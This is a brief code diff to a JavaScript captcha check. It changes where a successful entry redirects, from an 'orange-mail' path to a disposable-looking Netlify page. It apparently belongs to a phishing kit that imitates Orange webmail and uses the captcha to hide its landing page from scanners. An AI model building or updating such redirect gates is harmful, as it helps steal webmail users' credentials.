@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://iniklinkorng.mypi.co/orange-mail/oro/";
+        targetURL="https://stupendous-pony-72550f.netlify.app/wet3.html";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
